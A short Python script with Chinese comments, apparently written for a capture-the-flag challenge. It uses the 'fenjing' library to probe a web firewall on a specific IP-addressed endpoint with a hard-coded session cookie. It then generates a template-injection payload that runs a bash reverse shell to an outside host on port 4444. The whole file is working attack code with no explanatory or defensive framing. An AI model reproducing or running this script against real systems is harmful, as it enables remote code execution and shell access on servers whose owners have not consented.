import functools
import time
import requests
from fenjing import exec_cmd_payload

# 目标 URL 和 Cookie
url = "http://101.200.138.180:16356/evlelLL/646979696775616e"
cookies = {'session': 'eyJhbnN3ZXJzX2NvcnJlY3QiOnRydWV9.ZlGPsw.tUA2wCqTGfKC0lPfdhD15Bc8h0Y'}


@functools.lru_cache(1000)
def waf(payload: str):
    time.sleep(0.02)  # 避免请求过于频繁，休眠一小段时间
    resp = requests.post(url, cookies=cookies, timeout=10, data={"iIsGod": payload})
    # print(payload)
    print(resp.text)  # 打印响应内容（可选）
    return "大胆" not in resp.text


if __name__ == "__main__":
    # 使用外部库执行有效载荷，并获取执行结果和是否会产生回显的标志
    shell_payload, will_print = exec_cmd_payload(waf, 'bash -c "bash -i >& /dev/tcp/1.92.108.4/4444 0>&1"')

    if not will_print:
        print("这个 payload 不会产生回显！")

    print(f"{shell_payload=}")  # 打印 shell payload 的值
